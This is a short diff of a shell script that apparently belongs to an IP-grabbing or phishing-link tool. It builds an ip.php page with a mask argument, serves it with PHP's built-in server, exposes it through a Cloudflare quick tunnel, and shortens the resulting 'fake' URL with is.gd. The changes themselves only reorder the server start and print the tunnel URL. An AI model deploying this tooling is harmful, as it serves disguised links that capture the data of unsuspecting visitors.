@@ -44,8 +44,8 @@ ini_cloud(){
     fi
     sleep 10
     fkurl=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" ".cld.log")
-    echo "$host $port"
 
+    echo "$fkurl"
 }
 
 make_php(){
@@ -74,6 +74,8 @@ make_php(){
     exit();
     ?>
 EOF
+
+php -S "$host":"$port" > /dev/null 2>&1 &
 }
 
 loc=$(pwd)
@@ -113,7 +115,6 @@ fi
 
 cd .server && rm -f ip.php
 make_php "$msk"
-sleep 0.75 && php -S "$host":"$port" > /dev/null 2>&1 &
 ini_cloud
 cd "$loc"
 req=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${fkurl})
